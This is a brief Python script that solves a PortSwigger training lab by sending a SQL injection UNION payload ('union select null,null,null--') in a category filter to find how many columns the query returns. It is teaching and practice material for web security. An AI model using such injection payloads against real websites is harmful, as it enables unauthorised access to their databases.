# Lab name: Lab: SQL injection UNION attack, determining the number of columns returned by the query
# Lab link: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns

import requests
import os, sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

r = requests.Session()

url = input('Enter lab url: ')
proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

payload = "filter?category=Lifestyle'union+select+null,null,null--"

if url.endswith('.net'):
    url += f'/{payload}'
elif url.endswith('.net/'):
    url += f'{payload}'
else:
    print('invalid url')
    exit(-1)

response = r.get(url, proxies=proxies, verify=False)

if 'Congratulations, you solved the lab!' in response.text:
    print('Lab solved successfully')
else:
    if response.status_code == 504:
        print('Lab is not available, please refresh the url')
    else:
        print('failed to solve lab, please check you enter valid url')
